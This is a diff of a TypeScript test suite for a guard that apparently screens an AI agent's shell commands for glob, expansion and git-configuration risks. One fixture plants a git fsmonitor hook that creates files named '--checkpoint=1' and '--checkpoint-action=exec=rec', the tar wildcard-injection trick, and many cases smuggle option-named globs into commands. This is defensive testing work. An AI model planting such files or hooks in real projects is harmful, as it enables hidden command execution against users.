+    for (const [word, want] of [["*.js", true], ["-*", true], ["$y*", true], ["`x`*", true], ["?x", true], ["[ab]", true], ["src/*", false], ["a*", false], ["$?", false], ["$y", false], ["x", false]] as const) assert.equal(optionLedGlob(word, undefined), want, word);
+  });
+  test("r4 N3c-6: unit: the marks bash's globs get", () => {
+    const shown = (s: string) => markExpansions(s, 0, true).replace(/\u000e/g, "<u>").replace(/\u000f/g, "<q>").replace(/\u0010/g, "<g>");
+    assert.equal(shown(`ls * '*' "*" \\* $* $? \${x#*} [a] $(ls ?) "\${y[*]}" a*`), `ls <g>* '*' "*" \\* <u>$* <u>$? <u>\${x#*} <g>[a] <u>$(ls <g>?) "<q>\${y[*]}" a<g>*`);
+    assert.equal(shown("cat <<E\n$(ls *)\n*\nE"), "cat <<E\n$(ls <g>*)\n*\nE");
+    assert.equal(shown("echo `ls *` ${a:-*}"), "echo <u>`ls <g>*` <u>${a:-*}");
+    // Without `globs`, nothing changes.
+    assert.equal(markExpansions("ls * $x"), "ls * \u000e$x");
+  });
+});
+
+// ---- Round 4, N3d: what the third go's two checks found, and a bare expansion ----
+// One more tree: "fsmon" is a repository whose own configuration names a program of the project
+// for core.fsmonitor (`./hook` makes the two option-named files), which git runs for whatever
+// reads the index.
+const n3dTrees = new Map<string, string>();
+const n3dTree = (tree: N3cTree | "fsmon") => {
+  if (tree !== "fsmon") return tree === "plain" || tree === "dashed" ? n3Project(tree === "dashed") : n3cTree(tree);
+  if (!n3dTrees.has(tree)) {
+    const dir = b3Project();
+    fs.writeFileSync(path.join(dir, "x"), "x\n");
+    fs.writeFileSync(path.join(dir, "hook"), "#!/bin/sh\ntouch ./--checkpoint=1 ./--checkpoint-action=exec=rec\n", { mode: 0o755 });
+    execFileSync("git", ["-C", dir, "config", "core.fsmonitor", "./hook"], { stdio: "ignore" });
+    n3dTrees.set(tree, dir);
+  }
+  return n3dTrees.get(tree)!;
+};
+const expectN3d = (id: string, tree: N3cTree | "fsmon", want: Want | Want[], commands: string[], reason?: RegExp) => {
+  for (const c of commands) test(`r4 ${id}: ${tree}: ${Array.isArray(want) ? want.join(" or ") : want}: ${JSON.stringify(c)}`, async () => {
+    const dir = n3dTree(tree);
+    const d = await decideShell(guard, new SessionState(dir), dir, c);
+    const wants = Array.isArray(want) ? want : [want];
+    assert.ok(wants.includes(kind(d)), `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
+    if (reason) assert.match(d.reason, reason, c);
+  });
+};
+// The model's for a bare expansion, by the same rule; and the ask against the tree.
+const EXPANDED = /holds an expansion that bash splits and globs, which can match a name that begins with -, and another command of the call \(.*\) may make such a name before bash expands it/;
+const EXPANDED_HERE = /holds an expansion that bash splits and globs, which can match -\S*, a name here that \S+ would read as an option/;
+
+describe("r4 N3d-1: a loop runs the glob's own command again", () => {
+  // Every kind of loop, the command at any depth inside it; the reviewer's forms (p3, p5).
+  expectN3d("N3d-1", "n3c", "classify", [
+    "for i in 1 2; do tar -xf dash.tar --wildcards '*' *; done",
+    "for i in 1 2; do tar xf dash.tar *; done",
+    "while :; do tar -xf dash.tar --wildcards '*' * || break; done",
+    "while :; do tar -xf dash.tar --wildcards '*' *; done",
+    "until false; do tar -xf dash.tar --wildcards '*' *; done",
+    "for ((i=0;i<2;i++)); do tar -xf dash.tar --wildcards '*' *; done",
+    "for i in 1; do for j in 1 2; do tar -xf dash.tar --wildcards '*' *; done; done",
+    "for i in 1 2; do (tar -xf dash.tar --wildcards '*' *); done",
+    "for i in 1 2; do { tar -xf dash.tar --wildcards '*' *; }; done",
+    "for i in 1 2; do tar -xf dash.tar --wildcards '*' * | cat; done",
+    "for i in 1 2; do echo $(tar -xf dash.tar --wildcards '*' *); done",
+    "for i in 1 2; do tar -xf dash.tar --wildcards '*' * & done; wait",
+    "for i in 1 2; do tar -xf dash.tar --wildcards '*' * && break; done",
+    "for i in 1 2; do if true; then tar xf dash.tar *; fi; done",
+    "for i in 1 2; do cp -r tpl/. . *; done",
+    // The condition of a `while` or `until` runs again too, a substitution in it as well.
+    "while tar -xf dash.tar --wildcards '*' *; do break; done",
+    "until ! tar -xf dash.tar --wildcards '*' *; do :; done",
+    "while echo $(tar -xf dash.tar --wildcards '*' *); do break; done",
+    "x=$(for i in 1 2; do tar xf dash.tar *; done)",
+  ], GLOBBED);
+  // In a nested shell's code, or in eval's, inside a loop or holding one.
+  expectN3d("N3d-1", "n3c", ["classify", "ask"], [
+    "select x in a b; do tar -xf dash.tar --wildcards '*' *; done",
+    "for i in 1 2; do bash -c \"tar -xf dash.tar --wildcards '*' *\"; done",
+    "for i in 1 2; do eval \"tar -xf dash.tar --wildcards '*' *\"; done",
+    "bash -c \"for i in 1 2; do tar -xf dash.tar --wildcards '*' *; done\"",
+    "for i in 1 2; do sh -c 'tar -xf dash.tar --wildcards \"*\" *'; done",
+  ]);
+  // Unchanged: a loop whose commands write nothing; a glob's own command that runs once, beside a
+  // loop; a loop variable over plain words.
+  expectN3d("N3d-1", "n3c", "allow", [
+    "for i in 1 2; do ls *; done",
+    "for f in a b; do wc -l $f; done",
+    "while false; do :; done; ls *",
+    "for v in a b; do echo $v; done; tar cf b.tar * f",
+    "tar cf b.tar * f; for v in a b; do cat $v; done",
+    "tar cf b.tar *",
+  ]);
+});
+
+describe("r4 N3d-2: `--` exempts a glob only behind words known to take no value", () => {
+  // The variant check's four hits (Sonnet F1), the reading's (Opus F5), and grep's and sort's.
+  expectN3d("N3d-2", "plain", "classify", [
+    "make && git blame -I -- --cont* f",
+    "make && git blame {-n,-I} -- --cont* f",
+    "make && git blame -I -- --ignore* f",
+    "make && git shortlog -I -- *",
+    "make && git ls-files -x -- *",
+    "make && grep -X -- *",
+    "make && sort -y -- *",
+    "make && ls -Ia -- *",
+    "make && head -n5 -- *",
+    "make && cut -c1 -- *",
+    "make && tail -5 -- *",
+  ], GLOBBED);
+  expectN3d("N3d-2", "plain", ["classify", "ask"], [
+    "touch a; git tag -u -- *",
+    "touch a; git tag -l -u -- *",
+    "touch a; git format-patch -v -- *",
+    "touch a; git apply -p -- *",
+    "touch a; git am -p -- *",
+    "touch a; git fetch -j -- *",
+    "touch a; git rebase -x -- *",
+    "touch a; git push -o -- *",
+  ]);
+  // Still a name: behind `--` after the program, an operand, a long option with `=`, or letters on
+  // the list (git: per subcommand).
+  expectN3d("N3d-2", "plain", "allow", [
+    "make && git add -- *",
+    "npm test && ls -- *.log",
+    "make && ls -la -- *",
+    "make && git log -p -- *.c",
+    "make && git grep -n x -- *",
+    "make && git blame -w -- *",
+    "make && head -5 -- *",
+    "make && grep -rn x -- *",
+    "make && git -C src log -- *",
+  ]);
+});
+
+describe("r4 N3d-3: a bare unquoted expansion is judged as a glob", () => {
+  // The variant check's list, after a command that may write.
+  expectN3d("N3d-3", "plain", "classify", [
+    "make && ls ${x:-*}",
+    "make && ls ${x-*}",
+    "make && ls ${x:=*}",
+    "make && ls ${x+*}",
+    "make && ls ${x:+*}",
+    "make && ls $(echo '*')",
+    "make && ls $(printf '*')",
+    "x='*'; make && ls $x",
+    "make && ls $x",
+    "make && echo $x",
+    "make && ls a$x",
+    "make && ls `echo x`",
+    "make && echo ${y#*/}",
+    "make && ls $_",
+    "make && for f in $x; do :; done",
+    "x=src; make && ls ${x:-*}",
+    "if true; then x=src; fi; make && ls $x",
+    "make; x=src; ls $x",
+    "set -- '*'; make && ls $1",
+    "set -- '*'; make && ls $*",
+    // A function's own positional parameters (a function named like a reader: `ls '*'`), and a
+    // nested shell's, which also do not see the call's variables.
+    "ls() { command ls $1; }; make && ls '*'",
+    "make && bash -c 'ls $1' x '*'",
+    "x=src; make && bash -c 'ls $x'",
+  ], EXPANDED);
+  // Where the check cannot tell where the command runs, the model's even with no writer.
+  expectN3d("N3d-3", "plain", "classify", ["cd \"$d\" && ls $x"], /holds an expansion that bash splits and globs, in a place the check cannot tell/);
+  // The same against the tree: where a name that begins with `-` is there.
+  expectN3d("N3d-3", "dashed", "ask", [
+    "ls ${x:-*}",
+    "ls ${x-*}",
+    "ls ${x:=*}",
+    "ls ${x+*}",
+    "ls ${x:+*}",
+    "ls $(cat f)",
+    "x='*'; ls $x",
+    "echo $x",
+  ], EXPANDED_HERE);
+  // (An older check asks first here, for the quoted `'*'` of the inner echo or printf.)
+  expectN3d("N3d-3", "dashed", "ask", ["ls $(echo '*')", "ls $(printf '*')"]);
+  // Unchanged: a special parameter, a variable the call sets to a literal first, a loop's
+  // variable over plain words, a quoted expansion, one behind `--`.
+  expectN3d("N3d-3", "plain", "allow", [
+    "npm test; echo $?",
+    "make && echo $# $$ $! $0 $1 $- ${?}",
+    "make && echo $*",
+    "make && echo ${*}",
+    "x=src; ls $x",
+    "x=src; make && ls $x",
+    "x=src; make && ls ${x}",
+    "for f in a b; do wc -l $f; done",
+    "make && for f in a b; do wc -l $f; done",
+    "make && ls \"$x\"",
+    "make && ls \"${x:-*}\"",
+    "make && ls -- $x",
+    "set -o pipefail; make && echo $1",
+    "echo $(date)",
+    "echo $(date +%s) $(id -u)",
+  ]);
+  expectN3d("N3d-3", "dashed", "allow", ["npm test; echo $?", "x=src; ls $x", "for f in a b; do wc -l $f; done", "ls \"$x\"", "ls -- $x"]);
+});
+
+describe("r4 N3d-4: a word that begins with an arithmetic expansion begins with an expansion", () => {
+  // (N3d's variant check: a word that begins with arithmetic and goes on cannot be printed for the
+  // rules (`curl $((-1))d`), and the printer asks for it before this rule is reached: these ask.)
+  expectN3d("N3d-4", "plain", "ask", ["touch a; ls $((-1))*", "x=-1; touch a; ls $((x))*", "touch a; ls $((1-2))x*", "touch a && ls \"$((-1))\"*", "touch a && ls ''$((-1))*", "ls $((-1))*"]);
+  // In a nested shell's code and in eval's; beside an assignment of a literal (which the printer
+  // does not read as one where the call holds arithmetic).
+  expectN3d("N3d-4", "plain", ["ask", "classify"], ["touch a; bash -c 'ls $((-1))*'", "touch a; eval 'ls $((-1))*'", "y=a; touch a; ls $((-1))*"]);
+  expectN3d("N3d-4", "dashed", "ask", ["ls $((-1))*"]);
+  // Unchanged: a word with plain text first; a word that begins with 0 in a call without one.
+  expectN3d("N3d-4", "plain", "allow", ["make && ls 0*", "make && echo $((1+2))"]);
+});
+
+describe("r4 N3d-5: git's readers that read the index are held to its configuration", () => {
+  // (After the merge with B9: `tar cf b.tar *` is a write of b.tar, and in the fsmon repository B8's configuration check sends every git command after a write to the model first; so these rows take a glob reader that writes nothing (`wc -l *`), and hold N3d's own rule.)
+  expectN3d("N3d-5", "fsmon", "classify", ["git rev-parse :f && wc -l *", "git rev-list --all --indexed-objects && wc -l *", "git rev-parse HEAD && wc -l *", "git rev-list HEAD && wc -l *"], GLOBBED);
+  // The rest of the group reads no index (each run with such a hook: xcheck/n3d/fsmon.out).
+  expectN3d("N3d-5", "fsmon", "allow", ["git ls-tree HEAD && wc -l *", "git merge-base HEAD HEAD && wc -l *", "git show-ref && wc -l *", "git count-objects && wc -l *", "git branch && wc -l *"]);
+  expectN3d("N3d-5", "plain", "allow", ["git rev-parse :f && wc -l *", "git rev-list HEAD && wc -l *"]);
+});
+
+describe("r4 N3d-6: the helpers, line by line", () => {
+  const { behindDashDash, optionLedGlob, loopCommands, unknownExpansion } = guardModule as unknown as {
+    behindDashDash: (argv: string[], marked: string[] | undefined, p: number, k: number) => boolean;
+    optionLedGlob: (word: string, marked: string | undefined, arith?: boolean) => boolean;
+    loopCommands: (cmds: { argv: string[]; out: string[]; subshell?: boolean }[], top: number) => Set<number>;
+    unknownExpansion: (word: string, marked: string | undefined, known: (name: string) => boolean, positional: boolean) => boolean;
+  };
+  // The letters each program takes with no value, as the installed binaries answered
+  // (xcheck/n3d/letters.mts: `P -L`, `P -L -- -Q`, `P -LQ`).
+  const NO_VALUE: Record<string, string> = {
+    ls: "abcdfghiklmnopqrstuvxABCDFGHLNQRSUXZ1", cat: "benstuvAET", head: "qvz0123456789", tail: "fqvzF", wc: "clmwL",
+    grep: "abchilnoqrsuvwxyzEFGHILPRTUVZ0123456789", egrep: "abchilnoqrsuvwxyzEHILRTUVZ0123456789", fgrep: "abchilnoqrsuvwxyzFHILRTUVZ0123456789",
+    rg: "abchilnopqsuvwxzFHILNPSUV0", rm: "dfirvIR", cp: "abdfilnprsuvxHLPRTZ", mv: "bfinuvTZ", ln: "bdfinrsvFLPT", du: "abchklmsxDHLPS0",
+    stat: "ftL", sort: "bcdfghimnrsuzCMRV", cut: "nsz", touch: "acfhm", chmod: "cfhvHLPR", mkdir: "pvZ",
+  };
+  const GIT_NO_VALUE: Record<string, string> = {
+    add: "efinpuvAN", rm: "fnqr", mv: "fknv", "ls-files": "cdfikmostuvz", grep: "achilnopqrvwzEFGHILPW0123456789",
+    log: "abcgimpqrstuvwzDEFPRWX", diff: "abcghimpqrstuvwzDEFPRWX", show: "abcgimpqrstuvwzDEFPRWX", blame: "abcefgilmnprstuvwzDEFPRWX",
+    checkout: "dflmpq23", restore: "mpqSW23", status: "bsuvz", shortlog: "abcegimnprstuvzDEFPRWX",
+  };
+  const ALL = [..."abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"];
+  test("r4 N3d-6: unit: each program's letters that take no value, and no other", () => {
+    for (const [name, letters] of Object.entries(NO_VALUE)) {
+      assert.equal(behindDashDash([name, "--", "*"], undefined, 0, 2), true, name);
+      for (const l of ALL) assert.equal(behindDashDash([name, `-${l}`, "--", "*"], undefined, 0, 3), letters.includes(l), `${name} -${l}`);
+      // A cluster: every letter on the list.
+      assert.equal(behindDashDash([name, `-${letters.slice(0, 2)}`, "--", "*"], undefined, 0, 3), true, name);
+      assert.equal(behindDashDash([name, `-${letters[0]}J`, "--", "*"], undefined, 0, 3), letters.includes("J"), name);
+    }
+    for (const name of ["echo", "test", "[", "find", "tar", "printf", "xargs", "env"]) assert.equal(behindDashDash([name, "--", "*"], undefined, 0, 2), false, name);
+  });
+  test("r4 N3d-6: unit: git's subcommands, each with its letters; any other subcommand none", () => {
+    for (const [sub, letters] of Object.entries(GIT_NO_VALUE)) {
+      assert.equal(behindDashDash(["git", sub, "--", "*"], undefined, 0, 3), true, sub);
+      assert.equal(behindDashDash(["git", "-C", "src", sub, "--", "*"], undefined, 0, 5), true, sub);
+      for (const l of ALL) assert.equal(behindDashDash(["git", sub, `-${l}`, "--", "*"], undefined, 0, 4), letters.includes(l), `git ${sub} -${l}`);
+      assert.equal(behindDashDash(["git", sub, "x", "--", "*"], undefined, 0, 4), true, sub);
+      assert.equal(behindDashDash(["git", sub, "--x=y", "--", "*"], undefined, 0, 4), true, sub);
+      assert.equal(behindDashDash(["git", sub, "--x", "--", "*"], undefined, 0, 4), false, sub);
+    }
+    for (const sub of ["tag", "branch", "format-patch", "apply", "am", "fetch", "rebase", "push", "notes", "rev-parse", "rev-list", "frobnicate", "archive"]) {
+      assert.equal(behindDashDash(["git", sub, "--", "*"], undefined, 0, 3), false, sub);
+      assert.equal(behindDashDash(["git", sub, "x", "--", "*"], undefined, 0, 4), false, sub);
+    }
+    assert.equal(behindDashDash(["git", "--", "*"], undefined, 0, 2), false);
+  });
+  test("r4 N3d-6: unit: the first `--` only (M12), and nothing marked before it", () => {
+    // `ls -- -I -- *`: the first `--` ends the options; `-I` and the second `--` are names.
+    assert.equal(behindDashDash(["ls", "--", "-I", "--", "*"], undefined, 0, 4), true);
+    assert.equal(behindDashDash(["ls", "-I", "--", "x", "--", "*"], undefined, 0, 5), false);
+    assert.equal(behindDashDash(["ls", "-l", "--", "*"], ["ls", "-l", "--", "\u0010*"], 0, 3), true);
+    assert.equal(behindDashDash(["ls", "-l$x", "--", "*"], ["ls", "-l\u000e$x", "--", "\u0010*"], 0, 3), false);
+  });
+  test("r4 N3d-6: unit: the commands a loop runs again", () => {
+    const c = (argv: string[], subshell = false) => ({ argv, out: [], ...(subshell ? { subshell } : {}) });
+    const at = (cmds: ReturnType<typeof c>[], top = cmds.length) => [...loopCommands(cmds, top)].sort((a, b) => a - b);
+    // for/while/until/select heads after any leading keyword; `done` closes; nested loops.
+    assert.deepEqual(at([c(["for", "i", "in", "1"]), c(["do", "tar", "x"]), c(["done"]), c(["ls"])]), [0, 1]);
+    assert.deepEqual(at([c(["while", ":"]), c(["do", "tar", "x"]), c(["done"])]), [0, 1]);
+    assert.deepEqual(at([c(["until", ":"]), c(["do", "tar", "x"]), c(["done"])]), [0, 1]);
+    assert.deepEqual(at([c(["select", "x", "in", "a"]), c(["do", "tar", "x"]), c(["done"])]), [0, 1]);
+    assert.deepEqual(at([c(["ls"]), c(["if", "while", "false"]), c(["do", ":"]), c(["done"]), c(["then", "tar"]), c(["fi"])]), [1, 2]);
+    assert.deepEqual(at([c(["time", "while", "false"]), c(["do", "tar"]), c(["done"]), c(["tar"])]), [0, 1]);
+    assert.deepEqual(at([c(["!", "until", "false"]), c(["do", "tar"]), c(["done"])]), [0, 1]);
+    assert.deepEqual(at([c(["time", "-p", "while", "false"]), c(["do", "tar"]), c(["done"]), c(["tar"])]), [0, 1]);
+    assert.deepEqual(at([c(["{", "while", ":"]), c(["do", "tar"]), c(["done"]), c(["}"]), c(["tar"])]), [0, 1]);
+    assert.deepEqual(at([c(["if", "false"]), c(["then", "for", "i"]), c(["do", "tar"]), c(["done"]), c(["fi"]), c(["tar"])]), [1, 2]);
+    assert.deepEqual(at([c(["if", "false"]), c(["then", ":"]), c(["else", "until", ":"]), c(["do", "tar"]), c(["done"]), c(["fi"]), c(["tar"])]), [2, 3]);
+    assert.deepEqual(at([c(["if", "false"]), c(["then", ":"]), c(["elif", "while", ":"]), c(["do", "tar"]), c(["done"]), c(["then", "tar"]), c(["fi"])]), [2, 3]);
+    // Two heads in one command (a loop as another's condition) need two `done`s.
+    assert.deepEqual(at([c(["while", "until", "false"]), c(["do", ":"]), c(["done"]), c(["do", "tar"]), c(["done"]), c(["tar"])]), [0, 1, 3]);
+    assert.deepEqual(at([c(["for", "i"]), c(["do", "for", "j"]), c(["do", "tar"]), c(["done"]), c(["tar"]), c(["done"]), c(["tar"])]), [0, 1, 2, 4]);
+    // A substitution in the head of a loop is listed before it: it runs with the head.
+    assert.deepEqual(at([c(["ls"]), c(["tar"], true), c(["while", "echo", "$()"]), c(["do", "break"]), c(["done"])]), [1, 2, 3]);
+    assert.deepEqual(at([c(["tar"], true), c(["echo", "$()"], true), c(["while", "x=$()"]), c(["do"]), c(["done"])]), [0, 1, 2, 3]);
+    // ... but a head without one takes nothing before it.
+    assert.deepEqual(at([c(["tar"], true), c(["cat"], true), c(["while", ":"]), c(["do"]), c(["done"])]), [2, 3]);
+    // A keyword's name as an argument opens nothing; a `done` too many closes nothing.
+    assert.deepEqual(at([c(["echo", "while"]), c(["tar"])]), []);
+    assert.deepEqual(at([c(["done"]), c(["tar"])]), []);
+    assert.deepEqual(at([c(["done"]), c(["while", ":"]), c(["do", "tar"]), c(["done"])]), [1, 2]);
+    // A loop left open holds everything after it.
+    assert.deepEqual(at([c(["while", ":"]), c(["do", "tar"]), c(["tar"])]), [0, 1, 2]);
+    // A nested shell's code (after the top-level commands): wherever the call holds a loop.
+    assert.deepEqual(at([c(["bash", "-c", "x"]), c(["tar"])], 1), []);
+    assert.deepEqual(at([c(["for", "i"]), c(["do", "bash", "-c", "x"]), c(["done"]), c(["tar"])], 3), [0, 1, 3]);
+    assert.deepEqual(at([c(["bash", "-c", "x"]), c(["while", ":"]), c(["do", "tar"]), c(["done"])], 1), [1, 2, 3]);
+  });
+  test("r4 N3d-6: unit: a bare unquoted expansion", () => {
+    const none = () => false;
+    const x = (n: string) => n === "x";
+    const u = (s: string) => s.replace(/<u>/g, "\u000e").replace(/<q>/g, "\u000f").replace(/<g>/g, "\u0010");
+    for (const [marked, known, positional, want] of [
+      ["<u>$x", none, false, true],
+      ["<u>$x", x, false, false],
+      ["<u>${x}", x, false, false],
+      ["<u>${x:-y}", x, false, true],
+      ["<u>${x#y}", x, false, true],
+      ["<u>$y", x, false, true],
+      ["a<u>$x<u>$y", x, false, true],
+      ["<q>$y", none, false, false],
+      ["<u>$(ls)", none, false, true],
+      ["<u>`ls`", none, false, true],
+      ["<u>$?", none, false, false],
+      ["<u>$#", none, false, false],
+      ["<u>$$", none, false, false],
+      ["<u>$!", none, false, false],
+      ["<u>$-", none, false, false],
+      ["<u>$0", none, false, false],
+      ["<u>${?}", none, false, false],
+      ["<u>$1", none, false, false],
+      ["<u>$1", none, true, true],
+      ["<u>$0", none, true, true],
+      ["<u>$*", none, false, false],
+      ["<u>$@", none, false, false],
+      ["<u>${*}", none, false, false],
+      ["<u>$*", none, true, true],
+      ["<u>$_", none, false, true],
+      ["<u>$?<u>$x", none, false, true],
+      ["plain", none, false, false],
+    ] as const) assert.equal(unknownExpansion(u(marked).replace(/[\u000e\u000f\u0010]/g, ""), u(marked), known, positional), want, marked);
+    // Where the reading does not line up: every `$` and backtick but a special parameter.
+    assert.equal(unknownExpansion("$x", undefined, x, false), true);
+    assert.equal(unknownExpansion("\"$x\"", undefined, none, false), true);
+    assert.equal(unknownExpansion("$?", undefined, none, false), false);
+    assert.equal(unknownExpansion("`ls`", undefined, none, false), true);
+    assert.equal(unknownExpansion("x", undefined, none, false), false);
+  });
+  test("r4 N3d-6: unit: date and id write nothing", () => {
+    const { writesNothing } = guardModule as unknown as { writesNothing: (cmd: { argv: string[]; out: string[] }, gitQuiet?: () => boolean) => boolean };
+    for (const t of ["date", "date +%s", "date -u -d @0", "id", "id -u"]) assert.equal(writesNothing({ argv: t.split(" "), out: [] }), true, t);
+    assert.equal(writesNothing({ argv: ["date"], out: ["out.txt"] }), false);
+  });
+  test("r4 N3d-6: unit: a word that begins with an arithmetic expansion", () => {
+    assert.equal(optionLedGlob("0*", "0\u0010*", true), true);
+    assert.equal(optionLedGlob("0*", "0\u0010*", false), false);
+    assert.equal(optionLedGlob("0*", undefined, true), true);
+    assert.equal(optionLedGlob("0*", undefined, false), false);
+    assert.equal(optionLedGlob("a0*", "a0\u0010*", true), false);
+    assert.equal(optionLedGlob("0", "0", true), false);
+  });
 });
 
 // ---- round 4, group B, the go after the second part and the place shape (B7) ----
@@ -5444,18 +6462,19 @@ describe("r4 B7", () => {
         SessionState.moment = takeMoment;
       }
     });
-    test("r4 B7-1: where the temp directory cannot be written, there is no reading, and a script goes to the model", async () => {
+    // (B8-5: a temp directory that cannot be used is no longer the end: the state directory and
+    // the home directory are read next. No reading is where none of the directories can be.)
+    test("r4 B7-1: where no directory's clock can be read, there is no reading, and a script goes to the model", async () => {
       const f = b7Fixture();
-      const was = process.env.TMPDIR;
-      process.env.TMPDIR = path.join(f.dir, "no-such-directory");
+      const nowhere = [path.join(f.dir, "no-such-directory"), "/proc"];
+      assert.deepEqual(takeMoment(nowhere), { at: 0n, dev: undefined });
+      SessionState.moment = () => takeMoment(nowhere);
       try {
-        assert.deepEqual(takeMoment(), { at: 0n, dev: undefined });
         const r = await b7Kind(f.dir, "sh scripts/build.sh");
         assert.equal(r.kind, "classify", r.reason);
         assert.match(r.reason, /changed since this session began/);
       } finally {
-        if (was === undefined) delete process.env.TMPDIR;
-        else process.env.TMPDIR = was;
+        SessionState.moment = takeMoment;
       }
       assert.equal((await b7Kind(f.dir, "sh scripts/build.sh")).kind, "allow");
     });
@@ -5486,8 +6505,9 @@ describe("r4 B7", () => {
         const ctime = (n: string) => fs.statSync(path.join(dir, n), { bigint: true }).ctimeNs;
         assert.ok(ctime("old") < at, "a file made before the moment is older on its own clock");
         assert.ok(ctime("new") >= at, "a file made after it is not");
-        // Where the plugin can make no file on that file system, the temp directory's clock stands.
-        assert.equal(decideModule.momentOn(moment, dev + 12345n, [dir]), moment.at);
+        // Where the plugin can make no file on that file system there is no trust (B8-5; the
+        // temp directory's clock stood there before).
+        assert.equal(decideModule.momentOn(moment, dev + 12345n, [dir]), 0n);
         // And no reading at all stays no trust.
         assert.equal(decideModule.momentOn({ at: 0n, dev: undefined }, dev, [dir]), 0n);
       } finally {
@@ -5509,10 +6529,13 @@ describe("r4 B7", () => {
         const f = b7Fixture();
         assert.deepEqual(await b7Session(f, [run, write, () => f.file(rel, "x\n"), run]), ["allow", "allow", "classify"]);
       });
-    // Where the session wrote nowhere the program lives, runs or looks up from, it runs as before.
-    test("r4 B7-2: a script in another directory, run there, is not touched by a write beside it", async () => {
+    // Where the session wrote nothing in the project (B8-3: anywhere in it counts), a script runs
+    // as before: a write outside every project root reaches only where it lives or runs.
+    test("r4 B7-2: a script is not touched by a write outside the project, and is by one in another directory of it", async () => {
       const f = b7Fixture();
-      assert.deepEqual(await b7Session(f, ["echo x > scripts/note.txt", () => f.file("scripts/note.txt", "x\n"), "cd tools && ./check.sh", "./tools/check.sh"]), ["allow", "allow", "classify"]);
+      const out = `../${path.basename(f.dir)}-note.txt`;
+      assert.deepEqual(await b7Session(f, [`echo x > ${out}`, "cd tools && ./check.sh", "./tools/check.sh"]), ["allow", "allow", "allow"]);
+      assert.deepEqual(await b7Session(f, ["echo x > scripts/note.txt", () => f.file("scripts/note.txt", "x\n"), "cd tools && ./check.sh", "./tools/check.sh"]), ["allow", "classify", "classify"]);
     });
     // Writes that stand later in the text and run earlier, or beside.
     b7Each("B7-2", "classify", [
@@ -5582,10 +6605,32 @@ describe("r4 B7", () => {
         const r = await b7Kind(f.dir, c, s);
         assert.equal(r.kind, "classify", r.reason);
       }
-      // What reads the objects and the index alone runs neither.
-      for (const c of ["git cat-file -p HEAD:f", "git cat-file -t HEAD", "git ls-files", "git ls-files -s", "git ls-files --others --exclude-standard", "git rev-parse HEAD", "git branch"]) {
+      // B8-2: with such keys in the repository's own configuration every git command goes to
+      // the model, the readers of objects too.
+      for (const c of ["git cat-file -p HEAD:f", "git cat-file -t HEAD", "git ls-files", "git ls-files -s", "git rev-parse HEAD", "git branch"]) {
         const r = await b7Kind(f.dir, c, s);
-        assert.equal(r.kind, "allow", r.reason);
+        assert.equal(r.kind, "classify", r.reason);
+      }
+    });
+    test("r4 B7-2: a textconv in the user's own configuration that names a project script: only what runs a textconv goes to the model", async () => {
+      const global = process.env.GIT_CONFIG_GLOBAL!;
+      const before = fs.readFileSync(global, "utf8");
+      const f = b7Fixture();
+      fs.writeFileSync(global, `${before}[diff "x"]\n\ttextconv = ./scripts/conv.sh\n`);
+      try {
+        const s = new SessionState(f.dir);
+        assert.deepEqual(await b7Session(f, ["echo x > scripts/note.txt", () => f.file("scripts/note.txt", "x\n")], s), ["allow"]);
+        for (const c of ["git cat-file --textconv HEAD:f", "git cat-file --batch --textconv", "git diff", "git log -p -1"]) {
+          const r = await b7Kind(f.dir, c, s);
+          assert.equal(r.kind, "classify", r.reason);
+        }
+        // What reads the objects and the index alone runs none.
+        for (const c of ["git cat-file -p HEAD:f", "git cat-file -t HEAD", "git ls-files", "git ls-files -s", "git ls-files --others --exclude-standard", "git rev-parse HEAD", "git branch", "git status"]) {
+          const r = await b7Kind(f.dir, c, s);
+          assert.equal(r.kind, "allow", r.reason);
+        }
+      } finally {
+        fs.writeFileSync(global, before);
       }
     });
   });
@@ -5648,7 +6693,9 @@ describe("r4 B7", () => {
         }
       });
     configured("an external diff in the project", "diff.external", "./scripts/conv.sh", ["git diff", "git log -p -1", "git show HEAD", "git stash list"], "classify");
-    configured("an external diff leaves the filter commands alone", "diff.external", "./scripts/conv.sh", ["git status", "git add f"], "allow");
+    // (B8-2: any key of the repository's own configuration that may name a program sends every
+    // git command to the model, not only the ones that would run it.)
+    configured("an external diff, for the commands that run none too", "diff.external", "./scripts/conv.sh", ["git status", "git add f"], "classify");
     configured("a driver's command", "diff.x.command", "scripts/conv.sh", ["git diff", "git blame f"], "classify");
     configured("a textconv", "diff.x.textconv", "sh scripts/conv.sh", ["git diff", "git log -p -1", "git show HEAD", "git describe --always"], "classify");
     configured("a clean filter that is a project script", "filter.y.clean", "./scripts/conv.sh", ["git status", "git add f", "git commit -m x", "git diff"], "classify");
@@ -5668,8 +6715,12 @@ describe("r4 B7", () => {
     // git-lfs's own filter, as `git lfs install` writes it into the user's configuration: a
     // program outside the project (here `cat`, by a name on PATH and by its path), its words a
     // subcommand, options and git's placeholder.
-    configured("a program outside the project, by name", "filter.lfs.clean", "cat clean -- %f", ["git status", "git add f", "git commit -m x", "git diff", "git log -1"], "allow");
-    configured("a program outside the project, by path", "filter.lfs.process", "/usr/bin/cat filter-process --skip", ["git status", "git diff", "git checkout plain"], "allow");
+    // (B8-2: in the repository's own configuration only the listed lines stand, git-lfs's own
+    // among them; any other program, wherever it lies, goes to the model. The user's own
+    // configuration is read as before: the test below.)
+    configured("a program outside the project, by name, in the repository's own configuration", "filter.lfs.clean", "cat clean -- %f", ["git status", "git add f", "git commit -m x", "git diff", "git log -1"], "classify");
+    configured("a program outside the project, by path, in the repository's own configuration", "filter.lfs.process", "/usr/bin/cat filter-process --skip", ["git status", "git diff"], "classify");
+    configured("git-lfs's own line", "filter.lfs.process", "git-lfs filter-process --skip", ["git status", "git diff", "git checkout plain"], "allow");
     test("r4 B7-3: a filter in the user's own configuration that names a program outside the project (git-lfs)", async () => {
       const global = process.env.GIT_CONFIG_GLOBAL!;
       const before = fs.readFileSync(global, "utf8");
@@ -5892,10 +6943,6 @@ describe("r4 B7", () => {
       "cd src && cd ../mylink && cat zzz",
       "cd src && cat ../mylink/zzz",
       "cd src && cat /proc/self/root/proc/self/cwd/zzz",
-      "cd src && cat /proc/self/cw[d]/zzz",
-      "cd src && cat /proc/sel?/cwd/zzz",
-      "cd src && cat /proc/thread-self/cw[d]/zzz",
-      "cd src && cat ../mylin?/zzz",
       "cd src && cat ../{mylink,x}/zzz",
       "cd src && cat /proc/self/cwd/../mylink/zzz",
       "cd src && head -n1 ../mylink/zzz",
